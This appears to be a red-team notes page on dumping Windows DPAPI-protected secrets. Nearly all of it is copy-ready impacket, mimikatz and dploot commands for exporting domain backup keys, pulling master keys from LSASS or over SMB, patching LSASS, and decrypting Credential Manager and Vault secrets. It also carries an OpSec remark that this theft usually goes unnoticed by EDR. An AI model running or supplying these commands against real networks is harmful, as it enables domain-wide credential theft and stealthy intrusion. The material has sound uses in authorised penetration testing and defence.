---
title: DPAPI Dump
---

[[notes/windows/credential-access-user]] trough the Data Protection API.

DPAPI encrypts a given secret with the preferred master key of the user or the machine master key in system context.
The user master keys are stored encrypted with a key derived from the users NT hash.
The machine master keys are encrypted with a secret that can be recovered from the `SYSTEM` and `SECURITY` registry hives.

DPAPI-protected secrets can be decrypted without worrying about keys just by passing the blob to `CryptUnprotectData()` in the context of the same user that encrypted the secret.
An exception are secrets with the `CRED_TYPE_DOMAIN_PASSWORD` flag ([source](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem)).
DPAPI refuses do decrypt this secrets trough `CryptUnprotectData()`.
Only LSASS itself can decrypt them.

> **OpSec:** Stealing DPAPI-protected secrets is usually not detected by EDRs.

Storage location of encrypted user master key files:

- `%USERPROFILE%\AppData\Local\Microsoft\Protect\%SID%\%GUID%`
- `%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID%`

For automated solutions that dump all kinds of DPAPI-protected secrets like cookies and saved passwords in browsers see [[notes/windows/credential-access-user]].

Other tools:

- [SharpDPAPI](https://github.com/ghostpack/sharpdpapi/), C# port of some Mimikatz DPAPI functionality

Untested tools:

- [DPAPISnoop](https://github.com/leftp/DPAPISnoop), crack master key file to recover user password
- [dpapi-ng](https://github.com/jborean93/dpapi-ng), Python library for DPAPI-NG / CNG DPAPI

References:

- [Detecting DPAPI Backup Key Theft](http://web.archive.org/web/20230731161355/https://www.dsinternals.com/en/dpapi-backup-key-theft-auditing/)
- [DPAPI: Don't Put Administration Passwords In](http://web.archive.org/web/20230719134515/https://www.login-securite.com/2023/07/13/dpapi-dont-put-administration-passwords-in/)
- [Operational guidance for offensive user DPAPI abuse](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)
- [Operational Guidance for Offensive User DPAPI Abuse](http://web.archive.org/web/20190630035532/http://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)
- [ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/dpapi](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/dpapi)
- [thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

# Manually

~~~
❯ mkdir ./masterkeys ./credentials
❯ impacket-smbclient corp.local/jdoeadm:'passw0rd1'@ws01.corp.local
# use c$
# cd /users/pentest1/appdata/roaming/microsoft/protect
# ls
-rw-rw-rw-         24  Fri Sep 15 15:06:34 2023 CREDHIST
drw-rw-rw-          0  Fri Sep 15 15:06:34 2023 S-1-5-21-1111111111-2222222222-333333333-44444
-rw-rw-rw-         76  Fri Sep 15 15:06:34 2023 SYNCHIST
# cd S-1-5-21-1111111111-2222222222-333333333-44444
# mget *
# exit
❯ popd
❯ pushd ./credentials
❯ impacket-smbclient corp.local/jdoeadm:'passw0rd1'@ws01.corp.local
# use c$
# cd /users/pentest1/appdata/local/microsoft/credentials
# mget *
# cd /users/pentest1/appdata/roaming/microsoft/credentials
# mget *
# exit
❯ popd
❯ masterkey="$(impacket-dpapi masterkey -t corp.local/jdoe:'passw0rd2'@dc01.corp.local -file ./masterkeys/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee | rg --replace '$1' '^Decrypted key: (.+)$')"
❯ for cred in ./credentials/*; do impacket-dpapi credential -file $cred -key $masterkey; done
~~~

# Dump domain backup keys

As domain admin obtain the domain backup keys from a DC.
It can be used to decrypt all user master key files.

=== "[[notes/tools/mimikatz]]"
    ~~~ bash
    .\mimikatz.exe "lsadump::backupkeys /export /system:dc01.corp.local" exit
    ~~~

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi backupkeys --export -t corp.local/administrator:'passw0rd'@dc01.corp.local
    ~~~

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot backupkey -outputfile ./corp.pvk -d corp.local -u administrator -p 'passw0rd' dc01.corp.local
    ~~~

# Decrypt master key files

As local admin dump cached plain master keys from LSASS.

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe sekurlsa::dpapi exit
    ~~~

As domain admin decrypt the master key file of every user with the domain backup key.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot masterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -pvk ./corp.pvk -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi masterkey -pvk ./corp.pvk -file ./ws01/dpapi/masterkeys/$SID/$GUID
    ~~~

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe "dpapi::masterkey /pvk:.\corp.pvk /in:%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID%" exit
    ~~~

As local admin decrypt the master key file of every user you know the password or NT hash of.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot masterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -passwords ./credentials.txt -u administrator -p 'passw0rd' ws01.corp.local
    dploot masterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -nthashes ./nthashes.txt -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi masterkey -file ./ws01/dpapi/masterkeys/$SID/$GUID -sid $SID -password 'passw0rd'
    ~~~

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe "dpapi::masterkey /protected /in:%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID% /sid:%SID% /password:passw0rd" exit
    ~~~

Decrypt a domain users master key file when you have the users password, NT hash or code execution in the users context by retrieving the users backup key from a DC over MSRPC.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi masterkey -f ./ws01/dpapi/masterkeys/$SID/$GUID -t administrator:'passw0rd'@ws01.corp.local
    ~~~

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe "dpapi::masterkey /rpc /in:%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID%" exit
    ~~~

As local admin download all machine master key files.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot machinemasterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

Decrypt a machine master key file with key material extracted from the `SYSTEM` and `SECURITY` registry hives.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi masterkey -system ./ws01-system.save -security ./ws01-security.save -file ./ws01/dpapi/masterkeys/$GUID
    ~~~

# Decrypt protected secrets

## Credential Manager

Find credential files.

~~~ bat
cmdkey.exe /list
dir %USERPROFILE%\AppData\Local\Microsoft\Credentials
dir %USERPROFILE%\AppData\Roaming\Microsoft\Credentials
dir %SYSTEMROOT%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
dir %SYSTEMROOT%\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials
~~~

As local admin search for user credential files and decrypt them with the domain backup key or plain master keys.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot credentials -export-cm ./ws01/credman -pvk ./corp.pvk -u administrator -p 'passw0rd' ws01.corp.local
    dploot credentials -export-cm ./ws01/credman -mkfile ./ws01.mkf -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

As local admin search for machine credential files, download the machine master key files, dump the registry hives, decrypt the machine master keys and finally decrypt the machine credentials.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-systemdpapidump -creds administrator:'passw0rd'@ws01.corp.local
    ~~~

As local admin search for machine credential files and decrypt them with plain master keys.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot machinecredentials -export-cm ./ws01/credman -mkfile ./ws01.mkf -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

Decrypt a credential file with a plain master key.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi credential -file ./example.crd -key $masterkey
    ~~~

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe "dpapi::cred /in:%USERPROFILE%\AppData\Roaming\Microsoft\Credentials\... /masterkey:%KEY%" exit
    ~~~

References:

- [tools.thehacker.recipes/mimikatz/modules/dpapi/cred](https://tools.thehacker.recipes/mimikatz/modules/dpapi/cred)
- [github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

## Vault

The Vault is the backend of the *Remember password* functionality for SMB and RDP logins.
There are two primary vaults: *Web Credentials* for storing browser credentials and *Windows Credentials* for SMB and RDP.

Find vault files.

~~~ bat
vaultcmd.exe /list
vaultcmd.exe /listcreds:"Web Credentials"
vaultcmd.exe /listcreds:"Windows Credentials"
dir %USERPROFILE%\AppData\Local\Microsoft\Vault
dir %USERPROFILE%\AppData\Roaming\Microsoft\Vault
dir %PROGRAMDATA%\Microsoft\Vault
dir %SYSTEMROOT%\system32\config\systemprofile\AppData\Local\Microsoft\Vault
dir %SYSTEMROOT%\system32\config\systemprofile\AppData\Roaming\Microsoft\Vault
rundll32.exe keymgr.dll,KRShowKeyMgr
~~~

Patch the check for the `CRED_TYPE_DOMAIN_PASSWORD` flag in LSASS and decrypt all secrets.

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe "vault::cred /patch" exit
    ~~~

As local admin search for user vault files and decrypt them with the domain backup key or plain master keys.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot vaults -export-vpol ./ws01/vault -pvk ./corp.pvk -u administrator -p 'passw0rd' ws01.corp.local
    dploot vaults -export-vpol ./ws01/vault -mkfile ./ws01.mkf -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

As local admin search for machine vault files and decrypt them with plain master keys.

=== "[[notes/tools/dploot]]"
    ~~~ bash
    dploot machinevaults -export-vpol ./ws01/vault -mkfile ./ws01.mkf -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

Decrypt a vault file with a plain master key.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dpapi vault -vcrd ./example.vcrd -vpol ./example.vpol -key $masterkey
    ~~~

References:

- [tools.thehacker.recipes/mimikatz/modules/dpapi/vault](https://tools.thehacker.recipes/mimikatz/modules/dpapi/vault)
